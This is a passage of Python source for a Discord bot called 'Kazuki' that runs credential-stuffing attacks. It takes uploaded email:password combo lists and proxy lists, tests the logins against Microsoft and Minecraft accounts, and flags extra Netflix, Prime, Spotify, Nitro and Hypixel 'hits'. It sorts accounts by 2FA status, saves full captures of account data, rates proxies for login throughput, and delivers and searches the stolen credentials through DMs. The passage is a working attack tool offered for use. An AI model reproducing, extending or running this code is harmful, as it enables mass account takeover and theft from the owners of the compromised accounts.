            if "Hit" in (nf or ""): self._inc(netflix_hit=1); self._write("extras","Netflix.txt",f"{email}:{pw} | {nf}")
            else: self._inc(netflix_bad=1)

        # prime
        if not self._is_disabled("prime") and self.version=="v4":
            pm=_check_prime(session,email,pw)
            cap["prime"]=pm
            if "Hit" in (pm or ""): self._inc(prime_hit=1); self._write("extras","Amazon.txt",f"{email}:{pw} | {pm}")
            else: self._inc(prime_bad=1)

        self._inc(hits=1)
        self.recent_hits.append(cap)
        self._save_capture(cap)

    def _save_capture(self, c):
        lines=[
            f"Email:      {c['email']}",
            f"Password:   {c['pw']}",
            f"Name:       {c.get('name','N/A')}",
            f"UUID:       {c.get('uuid','')}",
            f"Type:       {c.get('type','')}",
            f"Capes:      {c.get('capes','')}",
        ]
        for k,label in [("access","Email Access"),("namechange","Name Change"),("lastchange","Last Changed"),
            ("migration","Migration"),("hypixel","Hypixel"),("hylevel","Hypixel Level"),
            ("hyfirst","First Login"),("hylast","Last Login"),("hybwstars","BW Stars"),
            ("optifine","Optifine Cape"),("nitro","Nitro"),("billing","Billing"),
            ("boosts","Boosts"),("friends","Friends"),("donut_banned","Donut Banned"),
            ("donut_bal","Donut Balance"),("donut_shards","Donut Shards"),("donut_pt","Donut Playtime"),
            ("spotify","Spotify"),("netflix","Netflix"),("prime","Prime"),
        ]:
            if c.get(k) is not None: lines.append(f"{label}:    {c[k]}")
        if c.get("promos"):
            for p in c["promos"]: lines.append(f"Promo:      {p}")
        lines.append("="*44)
        self._write("captures","Capture.txt","\n".join(lines))

    def zip_results(self):
        buf=io.BytesIO()
        with zipfile.ZipFile(buf,'w',zipfile.ZIP_DEFLATED) as zf:
            for root,_,files in os.walk(self.rdir):
                for fn in files:
                    fp=os.path.join(root,fn)
                    arc=os.path.relpath(fp,self.rdir)
                    zf.write(fp,arc)
        buf.seek(0); return buf

    def cleanup(self):
        try: shutil.rmtree(self.rdir, ignore_errors=True)
        except: pass

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY CHECKER
# ══════════════════════════════════════════════════════════════════════════════

class ProxyCheckJob:
    def __init__(self, uid, proxies):
        self.uid=uid; self.proxies=proxies; self.running=True
        self.results={"http":{"working":[],"dead":[]},"socks4":{"working":[],"dead":[]},"socks5":{"working":[],"dead":[]}}
        self.checked=0; self.total=len(proxies)
        self._lock=threading.Lock()
        self.good_for_mc=[]

    def _check_one(self, proxy):
        for ptype in ["http","socks4","socks5"]:
            url=f"{ptype}://{proxy}"
            try:
                r=requests.get("https://api.minecraftservices.com/",
                    proxies={"http":url,"https":url},timeout=6,verify=False)
                if r.status_code in (200,403,404,405):
                    with self._lock:
                        self.results[ptype]["working"].append(proxy)
                        self.checked+=1
                    return
            except: pass
        with self._lock:
            for pt in ["http","socks4","socks5"]:
                self.results[pt]["dead"].append(proxy)
            self.checked+=1

    def _check_mc_quality(self, proxy, ptype):
        """Rate proxy quality by MC auth page speed."""
        url=f"{ptype}://{proxy}"
        try:
            t0=time.time()
            r=requests.get("https://login.live.com/",
                proxies={"http":url,"https":url},timeout=8,verify=False)
            elapsed=time.time()-t0
            if r.status_code==200:
                return elapsed
        except: pass
        return None

    def run(self, threads=30):
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futs=[ex.submit(self._check_one,p) for p in self.proxies]
            concurrent.futures.wait(futs)
        # quality check working proxies
        all_working=[]
        for pt in ["http","socks4","socks5"]:
            for p in self.results[pt]["working"]:
                all_working.append((p, pt))
        seen = set()
        unique_working = []
        for p, pt in all_working:
            if p not in seen:
                seen.add(p)
                unique_working.append((p, pt))
        speeds={}
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            futs={ex.submit(self._check_mc_quality,p,pt):p for p,pt in unique_working}
            for f in concurrent.futures.as_completed(futs):
                p=futs[f]; t=f.result()
                if t is not None: speeds[p]=t
        for p,t in speeds.items():
            if t<2.0: self.good_for_mc.append(("HIGH",p,t))
            elif t<4.0: self.good_for_mc.append(("MID",p,t))
            else: self.good_for_mc.append(("LOW",p,t))
        self.good_for_mc.sort(key=lambda x:x[2])
        self.running=False

    def zip_results(self):
        buf=io.BytesIO()
        with zipfile.ZipFile(buf,'w') as zf:
            for pt in ["http","socks4","socks5"]:
                working=self.results[pt]["working"]
                dead=self.results[pt]["dead"]
                if working: zf.writestr(f"{pt}/working.txt","\n".join(working))
                if dead:    zf.writestr(f"{pt}/dead.txt","\n".join(dead))
            # quality tiers
            high=[f"{p} ({t:.2f}s)" for q,p,t in self.good_for_mc if q=="HIGH"]
            mid= [f"{p} ({t:.2f}s)" for q,p,t in self.good_for_mc if q=="MID"]
            low= [f"{p} ({t:.2f}s)" for q,p,t in self.good_for_mc if q=="LOW"]
            if high: zf.writestr("mc_quality/HIGH.txt","\n".join(high))
            if mid:  zf.writestr("mc_quality/MID.txt","\n".join(mid))
            if low:  zf.writestr("mc_quality/LOW.txt","\n".join(low))
        buf.seek(0); return buf

# ══════════════════════════════════════════════════════════════════════════════
#  FILE UTILS
# ══════════════════════════════════════════════════════════════════════════════

async def read_attachment(att):
    data=await att.read()
    lines=[]
    if att.filename.endswith(".zip"):
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for name in zf.namelist():
                if name.endswith(".txt"):
                    with zf.open(name) as f:
                        lines+=f.read().decode("utf-8","ignore").splitlines()
    else:
        lines=data.decode("utf-8","ignore").splitlines()
    return [l.strip() for l in lines if l.strip()]

async def extract_combos(att):
    lines=await read_attachment(att)
    return list(dict.fromkeys(l for l in lines if ":" in l))

async def extract_proxies(att):
    return await read_attachment(att)

def _save_combos_file(uid, filename, combos):
    os.makedirs(COMBOS_DIR, exist_ok=True)
    filename = os.path.basename(filename)
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    key=f"{uid}_{ts}_{filename}"
    path=os.path.join(COMBOS_DIR,key+".json")
    with open(path,"w") as f:
        json.dump({"uid":uid,"file":filename,"date":ts,"count":len(combos),"combos":combos},f)
    return key

def _load_combos_file(key):
    path=os.path.join(COMBOS_DIR,key+".json")
    if os.path.exists(path):
        with open(path) as f: return json.load(f)
    return None

def _list_combos(uid):
    files=[]
    for fn in sorted(os.listdir(COMBOS_DIR)):
        if fn.startswith(str(uid)) and fn.endswith(".json"):
            try:
                with open(os.path.join(COMBOS_DIR,fn)) as f: d=json.load(f)
                files.append(d)
            except: pass
    return files

# ══════════════════════════════════════════════════════════════════════════════
#  SESSION RUNNER
# ══════════════════════════════════════════════════════════════════════════════

async def run_checker(user, sess):
    active_sessions[user.id]=sess
    try:
        dm=await user.create_dm()
        msg=await dm.send(view=sess.stats_layout())
        loop=asyncio.get_event_loop()

        async def updater():
            try:
                while sess.running:
                    await asyncio.sleep(5)
                    if not sess.running:
                        break
                    try: await msg.edit(view=sess.stats_layout())
                    except: pass
            except asyncio.CancelledError:
                pass

        async def runner():
            try:
                threads=pending_sessions.get(user.id,{}).get("threads",50)
                await loop.run_in_executor(None, lambda: _run_sync(sess,threads))
            finally:
                sess.running=False

        await asyncio.gather(runner(), updater())
        try: await msg.edit(view=sess.stats_layout())
        except: pass

        buf=sess.zip_results()
        c=sess.C
        await dm.send(
            content=(f"✅ **Done!** `{c['checked']}` checked · ✅`{c['hits']}` hits · "
                     f"❌`{c['bad']}` bad · 🔒`{c['twofa']}` 2FA · 📧`{c['vm']}` VM")
        )
        await dm.send(file=discord.File(buf,filename=f"Kazuki_{sess.session_id}.zip"))
    except Exception as e:
        sess.running=False
        print(f"[Kazuki] Error in run_checker for user {user.id}: {e}")
    finally:
        sess.running=False
        active_sessions.pop(user.id,None)
        pending_sessions.pop(user.id,None)

def _run_sync(sess, threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs=[ex.submit(sess.process,c) for c in sess.combos]
        concurrent.futures.wait(futs)
    sess.running=False

# ══════════════════════════════════════════════════════════════════════════════
#  BOT EVENTS
# ══════════════════════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    print(f"[Kazuki] {bot.user} ({bot.user.id})")
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="combos | DM to start"))

@bot.event
async def on_message(message):
    if message.author.bot: return
    uid = message.author.id
    content = message.content.strip()

    is_cmd = content.lower().startswith("x")

    # In DMs — must be whitelisted
    if isinstance(message.channel, discord.DMChannel):
        if not is_wl(uid):
            if is_cmd: await message.channel.send("❌ Not whitelisted.")
            return
        if is_cmd:
            await bot.process_commands(message)
            return
        await handle_dm(message); return

    # In server channels
    if isinstance(message.channel, (discord.TextChannel, discord.Thread)):
        # Always allow owner/whitelisted users to use bot commands anywhere
        if is_cmd and is_wl(uid):
            await bot.process_commands(message)
            return
        # If not whitelisted but channel is enabled and they typed a command, tell them
        if is_cmd and is_enabled_channel(message.channel.id) and not is_wl(uid):
            await message.channel.send("❌ Not whitelisted.")
            return

async def show_help(ch, user):
    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(170, 0, 255))
    container.add_item(ui.TextDisplay("# 👻 Kazuki Help Menu"))
    container.add_item(ui.Separator())

    container.add_item(ui.TextDisplay(
        "### ⚙️ Checker Commands\n"
        "💬 `xcheck [v1-v4]` — Start check session (upload combo file)\n"
        "🔄 `xtoggle on/off` — Enable/disable bot in this channel\n"
        "🛑 `xstop` — Stop your active session\n"
        "⏸️ `xpause` — Pause/resume your session\n"
        "📊 `xstats` — View live stats of your session\n"
        "🔢 `xversion [v1-v4]` — Get/set default checker version\n"
        "🆔 `xsget <id>` — View detailed session stats & recent hits\n"
        "📦 `xcombos show` — Show your saved combo files\n"
        "🔌 `xdisable <module>` — Disable a checker module\n"
        "🔌 `xenable <module>` — Re-enable a checker module\n"
        "⚙️ `xmodules` — List all modules and their status\n"
        "📤 `xdrop <session_id>` — Export and drop all results/captures\n"
        "🔍 `xsearch` — Search checked accounts by query\n"
        "📡 `xcheckproxies` — Test proxy speeds and quality rating"
    ))

    if is_owner(user.id):
        container.add_item(ui.Separator())
        container.add_item(ui.TextDisplay(
            "### 👑 Owner Commands\n"
            "📋 `xwl add/remove/list <id>` — Whitelist administration\n"
            "💀 `xkillall` — Force stop all active sessions\n"
            "🥾 `xkick <user_id>` — Force stop a user's session\n"
            "📡 `xsessions` — View list of all active sessions\n"
            "📢 `xbroadcast <msg>` — Send a DM to all whitelisted users"
        ))

    layout.add_item(container)
    await ch.send(view=layout)

async def handle_dm(message):
    uid=message.author.id
    state=pending_sessions.get(uid,{}).get("state","")

    if state=="waiting_combo":
        if message.attachments:
            att=message.attachments[0]
            if not (att.filename.endswith(".txt") or att.filename.endswith(".zip")):
                await message.channel.send("❌ .txt or .zip only."); return
            await message.channel.send("⏳ Loading…")
            combos=await extract_combos(att)
            if not combos: await message.channel.send("❌ No valid combos."); return
            key=_save_combos_file(uid, att.filename, combos)
            pending_sessions[uid]["combos"]=combos
            pending_sessions[uid]["combo_key"]=key
            pending_sessions[uid]["state"]="waiting_proxy"
            await message.channel.send(
                f"✅ `{len(combos)}` combos loaded (saved as `{key}`).\n"
                "📡 Upload proxy file or type `skip`.")
        else:
            await message.channel.send("📎 Attach combo file (.txt/.zip).")
        return

    if state=="waiting_proxy":
        proxies=[]
        if message.content.strip().lower()=="skip": pass
        elif message.attachments:
            att=message.attachments[0]
            proxies=await extract_proxies(att)
            # save proxies
            os.makedirs(PROXIES_DIR,exist_ok=True)
            ts=datetime.now().strftime("%Y%m%d_%H%M%S")
            ppath=os.path.join(PROXIES_DIR,f"{uid}_{ts}.txt")
            with open(ppath,"w") as f: f.write("\n".join(proxies))
            await message.channel.send(f"✅ `{len(proxies)}` proxies loaded.")
        else:
            await message.channel.send("📎 Upload proxy file or type `skip`."); return
        pending_sessions[uid]["proxies"]=proxies
        pending_sessions[uid]["state"]="waiting_threads"
        await message.channel.send("🧵 Threads? (default `50`, proxyless max `5`)")
        return

    if state=="waiting_threads":
        try: t=int(message.content.strip())
        except: t=50
        
        # Clamp thread count to [1, 200] to prevent negative/zero/huge values crashing ThreadPoolExecutor
        has_proxies = bool(pending_sessions[uid].get("proxies"))
        max_allowed = 200 if has_proxies else 5
        if t < 1:
            t = 1
        elif t > max_allowed:
            t = max_allowed
            
        pending_sessions[uid]["threads"] = t
        pd=pending_sessions[uid]
        sid=str(int(time.time()))[-6:]
        disabled=get_disabled(uid)
        sess=CheckSession(uid,sid,pd["combos"],pd.get("version","v4"),
                          pd.get("proxies",[]),disabled)
        await message.channel.send(
            f"🚀 **Starting!**\n"
            f"📦 Combos: `{len(pd['combos'])}` · 🧵 Threads: `{t}` · "
            f"📡 Proxies: `{len(pd.get('proxies',[]))}` · "
            f"🔢 Version: `{pd.get('version','v4').upper()}`\n"
            f"🆔 Session: `{sid}`\n\n"
            "Stats update every 5s. Results DM'd when done.")
        asyncio.create_task(run_checker(message.author, sess))
        return

    await bot.process_commands(message)

# ══════════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="start")
async def cmd_start(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("❌ Owner only.")
        return
    await show_help(ctx.channel, ctx.author)

@bot.command(name="check")
async def cmd_check(ctx, version="v4"):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    if ctx.author.id in active_sessions: await ctx.send("⚠️ Already running. `xstop` first."); return
    version=version.lower()
    if version not in VERSIONS: version="v4"
    pending_sessions[ctx.author.id]={"state":"waiting_combo","version":version}
    try:
        dm=await ctx.author.create_dm()
        await dm.send(f"📎 Upload combo file (.txt/.zip)\nFormat: `email:pass` per line\nVersion: `{version.upper()}`")
    except discord.Forbidden:
        pending_sessions.pop(ctx.author.id, None)
        await ctx.send("❌ Cannot send DM. Please open your DMs first!")
        return
    if not isinstance(ctx.channel,discord.DMChannel): await ctx.send("📬 Check DMs!")

@bot.command(name="stop")
async def cmd_stop(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    stopped = False
    sess = active_sessions.get(ctx.author.id)
    if sess:
        sess.running = False
        stopped = True
    if ctx.author.id in pending_sessions:
        pending_sessions.pop(ctx.author.id, None)
        stopped = True
    
    if stopped:
        await ctx.send("🛑 Stopped session/setup.")
    else:
        await ctx.send("❌ No active session or pending setup.")

@bot.command(name="pause")
async def cmd_pause(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    sess=active_sessions.get(ctx.author.id)
    if not sess: await ctx.send("❌ No session."); return
    sess.paused=not sess.paused
    await ctx.send("⏸️ Paused." if sess.paused else "▶️ Resumed.")

@bot.command(name="stats")
async def cmd_stats(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    sess=active_sessions.get(ctx.author.id)
    if not sess: await ctx.send("❌ No session."); return
    await ctx.send(view=sess.stats_layout())

@bot.command(name="version")
async def cmd_version(ctx, ver=None):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    if ver:
        ver=ver.lower()
        if ver not in VERSIONS: await ctx.send(f"❌ Valid: {', '.join(f'`{k}`' for k in VERSIONS)}"); return
        pd=pending_sessions.get(ctx.author.id,{}); pd["version"]=ver
        pending_sessions[ctx.author.id]=pd
        vi=VERSIONS[ver]
        await ctx.send(f"{vi['emoji']} Set to **{vi['name']}**")
    else:
        cur=pending_sessions.get(ctx.author.id,{}).get("version","v4")
        layout = ui.LayoutView()
        container = ui.Container(accent_color=discord.Colour.from_rgb(0, 170, 255))
        container.add_item(ui.TextDisplay("# 🔢 Checker Versions\nUse `xcheck <version>` or `xversion <v1-v4>` to switch."))
        container.add_item(ui.Separator())

        for k,vi in VERSIONS.items():
            m=" ⭐ **[ Current ]**" if k==cur else ""
            container.add_item(ui.TextDisplay(f"### {vi['emoji']} `{k.upper()}` — {vi['name']}{m}\n{vi['desc']}"))
            container.add_item(ui.Separator())

        layout.add_item(container)
        await ctx.send(view=layout)

@bot.command(name="combos")
async def cmd_combos(ctx, action="show"):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    if action=="show":
        files=_list_combos(ctx.author.id)
        if not files: await ctx.send("No saved combo files."); return
        layout = ui.LayoutView()
        container = ui.Container(accent_color=discord.Colour.from_rgb(0, 170, 255))
        container.add_item(ui.TextDisplay("# 📦 Saved Combo Files"))
        container.add_item(ui.Separator())

        lines = []
        for i,f in enumerate(files[-20:],1):
            lines.append(f"**{i}.** `{f['file']}`\n> 📅 `{f['date']}`  •  📊 `{f['count']}` combos")

        container.add_item(ui.TextDisplay("\n\n".join(lines)))
        layout.add_item(container)
        await ctx.send(view=layout)

@bot.command(name="sget")
async def cmd_sget(ctx, session_id=None):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    # find session by id in active_sessions
    target=None
    for uid,sess in active_sessions.items():
        if sess.session_id==session_id or uid==ctx.author.id:
            target=sess; break
    if not target: await ctx.send(f"❌ Session `{session_id}` not found."); return
    c=target.C
    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(170, 0, 255))
    container.add_item(ui.TextDisplay(f"# 🆔 Session `{target.session_id}` Details"))
    container.add_item(ui.Separator())

    status_str = "🟢 Running" if target.running else "🔴 Finished"
    container.add_item(ui.TextDisplay(
        f"### 📊 Progress\n"
        f"> Checked: `{c['checked']}` / `{len(target.combos)}`  •  🎯 Hits: `{c['hits']}`  •  ❌ Bad: `{c['bad']}`\n"
        f"-# 🔢 Version: **{target.version.upper()}**  •  ⚙️ Status: **{status_str}**"
    ))

    # recent hits
    hits=list(target.recent_hits)[-10:]
    if hits:
        container.add_item(ui.Separator())
        val="\n".join(f"🎯 `{h['email']}:{h['pw']}` → **{h['type']}** • {h.get('name','?')} `({h['time']})`" for h in hits)
        container.add_item(ui.TextDisplay(f"### 🎯 Recent Hits\n{val[:1000]}"))

    # recent 2fa
    tfa=list(target.recent_2fa)[-5:]
    if tfa:
        container.add_item(ui.Separator())
        val="\n".join(f"🔒 `{t['email']}:{t['pw']}` `({t['time']})`" for t in tfa)
        container.add_item(ui.TextDisplay(f"### 🔒 Recent 2FA\n{val[:500]}"))

    # recent vm
    vms=list(target.recent_vm)[-5:]
    if vms:
        container.add_item(ui.Separator())
        val="\n".join(f"📧 `{v['email']}:{v['pw']}` `({v['time']})`" for v in vms)
        container.add_item(ui.TextDisplay(f"### 📧 Recent Valid Mail\n{val[:500]}"))

    layout.add_item(container)
    await ctx.send(view=layout)

@bot.command(name="drop")
async def cmd_drop(ctx, session_id=None):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    # find session
    target=None
    for uid,sess in active_sessions.items():
        if sess.session_id==session_id: target=sess; break
    # also check finished sessions in results dir
    rdir=None
    if not target:
        for dn in os.listdir(RESULTS_BASE):
            if session_id and session_id in dn:
                rdir=os.path.join(RESULTS_BASE,dn); break
    if not target and not rdir:
        await ctx.send(f"❌ Session `{session_id}` not found."); return

    try:
        dm=await ctx.author.create_dm()
        await dm.send(f"📤 Dropping profiles for session `{session_id}`…")
    except discord.Forbidden:
        await ctx.send("❌ Cannot send DM. Please open your DMs first!")
        return

    hits=[]
    sfas=[]; mfas=[]; tfa_list=[]

    if target:
        hits=list(target.recent_hits)
        rdir=target.rdir

    # read from files
    def _read(subdir,fn):
        p=os.path.join(rdir,subdir,fn)
        if os.path.exists(p):
            with open(p) as f: return [l.strip() for l in f if l.strip()]
        return []

    sfa_lines=_read("extras","SFA.txt")
    mfa_lines=_read("extras","MFA.txt")
    tfa_lines=_read("2fa","2fa.txt")
    hit_lines=_read("hits","AllHits.txt")
    cap_text=""
    cp=os.path.join(rdir,"captures","Capture.txt")
    if os.path.exists(cp):
        with open(cp) as f: cap_text=f.read()

    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(255, 68, 68))
    container.add_item(ui.TextDisplay(f"# 📤 Session `{session_id}` Drop Results"))
    container.add_item(ui.Separator())

    container.add_item(ui.TextDisplay(
        f"### 📊 Summary\n"
        f"🎯 Hits: **{len(hit_lines)}**  •  🛡️ SFA: **{len(sfa_lines)}**  •  🔑 MFA: **{len(mfa_lines)}**  •  🔒 2FA: **{len(tfa_lines)}**"
    ))

    if hit_lines:
        container.add_item(ui.Separator())
        val = "\n".join(f"🎯 `{l}`" for l in hit_lines[-15:])
        container.add_item(ui.TextDisplay(f"### 🎯 Recent Hits\n{val[:1000]}"))

    if sfa_lines:
        container.add_item(ui.Separator())
        val = "\n".join(f"🛡️ `{l}`" for l in sfa_lines[-10:])
        container.add_item(ui.TextDisplay(f"### 🛡️ SFA Accounts\n{val[:1000]}"))

    if mfa_lines:
        container.add_item(ui.Separator())
        val = "\n".join(f"🔑 `{l}`" for l in mfa_lines[-10:])
        container.add_item(ui.TextDisplay(f"### 🔑 MFA Accounts\n{val[:1000]}"))

    layout.add_item(container)
    await dm.send(view=layout)

    # Ask for 2FA check
    if tfa_lines:
        await dm.send(f"🔒 Found `{len(tfa_lines)}` 2FA accounts.\nReply `yes` to get full 2FA list, or `no` to skip.")
        def check(m): return m.author.id==ctx.author.id and isinstance(m.channel,discord.DMChannel) and not m.content.strip().lower().startswith("x")
        try:
            reply=await bot.wait_for("message",check=check,timeout=30)
            if reply.content.strip().lower()=="yes":
                buf=io.BytesIO("\n".join(tfa_lines).encode())
                await dm.send("🔒 2FA accounts:",file=discord.File(buf,"2fa_accounts.txt"))
        except asyncio.TimeoutError: pass

    # Send captures
    if cap_text:
        buf=io.BytesIO(cap_text.encode())
        await dm.send("📋 Full captures:",file=discord.File(buf,"captures.txt"))

    # Cleanup/drop the directory from disk
    try:
        shutil.rmtree(rdir, ignore_errors=True)
    except:
        pass
    await dm.send("🗑️ Session directory dropped and deleted from disk.")

@bot.command(name="search")
async def cmd_search(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    try:
        dm=await ctx.author.create_dm()
        layout1 = ui.LayoutView()
        container1 = ui.Container(accent_color=discord.Colour.from_rgb(0, 170, 255))
        container1.add_item(ui.TextDisplay(
            "# 🔍 Account Search\n"
            "Choose what query type to search by:\n"
            "💡 **Type:**\n"
            "1️⃣ — **Email**\n"
            "2️⃣ — **Password**\n"
            "3️⃣ — **Username (MC Name)**"
        ))
        layout1.add_item(container1)
        await dm.send(view=layout1)
    except discord.Forbidden:
        await ctx.send("❌ Cannot send DM. Please open your DMs first!")
        return

    def chk(m): return m.author.id==ctx.author.id and isinstance(m.channel,discord.DMChannel) and not m.content.strip().lower().startswith("x")
    try:
        mode_msg=await bot.wait_for("message",check=chk,timeout=30)
        mode=mode_msg.content.strip()
        if mode not in ("1","2","3"): await dm.send("❌ Invalid choice."); return
        label={"1":"email","2":"password","3":"MC username"}[mode]
        await dm.send(f"Enter the **{label}** to search:")
        query_msg=await bot.wait_for("message",check=chk,timeout=30)
        query=query_msg.content.strip().lower()
    except asyncio.TimeoutError:
        await dm.send("⏰ Timed out."); return

    await dm.send(f"🔍 Searching `{query}` in all results…")
    found=[]
    for sdir in os.listdir(RESULTS_BASE):
        spath=os.path.join(RESULTS_BASE,sdir)
        if not os.path.isdir(spath): continue
        # search captures
        cp=os.path.join(spath,"captures","Capture.txt")
        if os.path.exists(cp):
            with open(cp) as f: content=f.read()
            blocks=content.split("="*44)
            for block in blocks:
                if query in block.lower():
                    found.append(("capture",sdir,block.strip()))
        # search hit files
        for sub in ["hits","valid_mail","2fa","extras"]:
            for fn in os.listdir(os.path.join(spath,sub)) if os.path.exists(os.path.join(spath,sub)) else []:
                fp=os.path.join(spath,sub,fn)
                with open(fp) as f:
                    for line in f:
                        if query in line.lower():
                            found.append(("line",f"{sdir}/{sub}/{fn}",line.strip()))

    if not found:
        await dm.send("❌ Not found."); return
    layout2 = ui.LayoutView()
    container2 = ui.Container(accent_color=discord.Colour.from_rgb(0, 255, 0))
    container2.add_item(ui.TextDisplay(f"# 🔍 Search Results for `{query}`"))
    container2.add_item(ui.Separator())

    for kind,loc,data in found[:10]:
        if kind=="capture":
            container2.add_item(ui.TextDisplay(f"### 📋 Capture in `{loc}`\n```{data[:250]}```"))
        else:
            container2.add_item(ui.TextDisplay(f"### 📄 File: `{loc}`\n`{data[:180]}`"))
        container2.add_item(ui.Separator())

    if len(found)>10:
        container2.add_item(ui.TextDisplay(f"*And {len(found)-10} more results...*"))

    layout2.add_item(container2)
    await dm.send(view=layout2)

@bot.command(name="checkproxies")
async def cmd_checkproxies(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    try:
        dm=await ctx.author.create_dm()
        await dm.send("📎 Upload your proxy file (.txt/.zip, one `ip:port` per line)")
    except discord.Forbidden:
        await ctx.send("❌ Cannot send DM. Please open your DMs first!")
        return

    def chk(m): return m.author.id==ctx.author.id and isinstance(m.channel,discord.DMChannel) and m.attachments and not m.content.strip().lower().startswith("x")
    try:
        att_msg=await bot.wait_for("message",check=chk,timeout=60)
    except asyncio.TimeoutError:
        await dm.send("⏰ Timed out."); return

    proxies=await extract_proxies(att_msg.attachments[0])
    if not proxies: await dm.send("❌ No proxies found."); return

    job=ProxyCheckJob(ctx.author.id, proxies)
    proxy_check_jobs[ctx.author.id]=job

    msg=await dm.send(view=_proxy_layout(job))

    async def run_job():
        try:
            loop=asyncio.get_event_loop()

            async def updater():
                try:
                    while job.running:
                        await asyncio.sleep(4)
                        if not job.running:
                            break
                        try: await msg.edit(view=_proxy_layout(job))
                        except: pass
                except asyncio.CancelledError:
                    pass

            async def runner():
                try:
                    await loop.run_in_executor(None, lambda: job.run(30))
                finally:
                    job.running=False

            await asyncio.gather(runner(), updater())
            try: await msg.edit(view=_proxy_layout(job))
            except: pass
            buf=job.zip_results()
            high=len([x for x in job.good_for_mc if x[0]=="HIGH"])
            mid= len([x for x in job.good_for_mc if x[0]=="MID"])
            low= len([x for x in job.good_for_mc if x[0]=="LOW"])
            all_w=len(set(p for pt in job.results.values() for p in pt["working"]))
            await dm.send(
                content=(f"✅ **Proxy check done!**\n"
                         f"Total: `{len(proxies)}` · Working: `{all_w}`\n"
                         f"MC Quality — 🟢HIGH:`{high}` 🟡MID:`{mid}` 🔴LOW:`{low}`")
            )
            await dm.send(file=discord.File(buf,"Kazuki_proxies.zip"))
        except Exception as e:
            job.running=False
            print(f"[Kazuki Checker Error in proxy check job: {e}")
        finally:
            job.running=False
            proxy_check_jobs.pop(ctx.author.id,None)

    asyncio.create_task(run_job())

def _proxy_layout(job):
    pct = max(0.0, min(1.0, job.checked / job.total if job.total else 0.0))
    bar="█"*int(18*pct)+"░"*(18-int(18*pct))

    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(0, 170, 255))
    container.add_item(ui.TextDisplay("# 📡 Proxy Checker Status"))
    container.add_item(ui.Separator())

    container.add_item(ui.TextDisplay(
        f"### 📊 Progress\n"
        f"`[{bar}]` **{pct*100:.1f}%**\n"
        f"> Checked: `{job.checked}` / `{job.total}`\n"
        f"-# Status: **{'Running...' if job.running else 'Done ✅'}**"
    ))

    container.add_item(ui.Separator())

    # proxy types stats
    stats_lines = []
    for pt in ["http","socks4","socks5"]:
        w=len(job.results[pt]["working"]); d=len(job.results[pt]["dead"])
        stats_lines.append(f"🌐 **{pt.upper()}**: Working: `{w}`  •  Dead: `{d}`")
    container.add_item(ui.TextDisplay("### 🚀 Protocols\n" + "\n".join(stats_lines)))

    container.add_item(ui.Separator())

    h=len([x for x in job.good_for_mc if x[0]=="HIGH"])
    m=len([x for x in job.good_for_mc if x[0]=="MID"])
    l=len([x for x in job.good_for_mc if x[0]=="LOW"])
    container.add_item(ui.TextDisplay(
        f"### ⚡ Minecraft Quality Tiers\n"
        f"🟢 **HIGH**: `{h}`\n"
        f"🟡 **MID**: `{m}`\n"
        f"🔴 **LOW**: `{l}`"
    ))

    layout.add_item(container)
    return layout

@bot.command(name="modules")
async def cmd_modules(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    disabled=get_disabled(ctx.author.id)
    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(170, 0, 255))
    container.add_item(ui.TextDisplay("# ⚙️ Checker Modules"))
    container.add_item(ui.Separator())

    lines=[]
    for mod in CHECKER_MODULES:
        st="❌ OFF" if mod in disabled else "✅ ON"
        lines.append(f"🔌 `{mod}` — **{st}**")

    container.add_item(ui.TextDisplay(
        "💡 Enable or disable modules using `xenable <name>` or `xdisable <name>`.\n\n" + 
        "\n".join(lines)
    ))
    layout.add_item(container)
    await ctx.send(view=layout)

@bot.command(name="disable")
async def cmd_disable(ctx, module=None):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    if not module or module not in CHECKER_MODULES:
        await ctx.send(f"❌ Valid modules: {', '.join(f'`{m}`' for m in CHECKER_MODULES)}"); return
    dis=get_disabled(ctx.author.id)
    if module not in dis: dis.append(module)
    set_disabled(ctx.author.id,dis)
    await ctx.send(f"❌ `{module}` disabled.")

@bot.command(name="enable")
async def cmd_enable(ctx, module=None):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    if not module or module not in CHECKER_MODULES:
        await ctx.send(f"❌ Valid modules: {', '.join(f'`{m}`' for m in CHECKER_MODULES)}"); return
    dis=get_disabled(ctx.author.id)
    if module in dis: dis.remove(module)
    set_disabled(ctx.author.id,dis)
    await ctx.send(f"✅ `{module}` enabled.")


@bot.command(name="toggle")
async def cmd_toggle(ctx, action: str = None):
    """Enable/disable bot in this channel. Owner or server admin only."""
    is_admin = (is_owner(ctx.author.id) or
                (hasattr(ctx.author, "guild_permissions") and
                 ctx.author.guild_permissions.administrator))
    if not is_admin:
        await ctx.send("❌ Server admin or owner only."); return
